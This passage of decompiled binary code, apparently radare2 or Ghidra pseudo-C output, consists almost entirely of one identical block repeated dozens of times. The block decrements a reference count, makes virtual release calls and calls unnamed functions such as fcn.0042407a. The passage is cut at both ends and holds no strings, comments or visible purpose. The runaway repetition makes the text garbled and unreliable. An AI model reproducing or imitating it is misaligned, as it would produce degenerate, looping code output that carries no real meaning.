fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 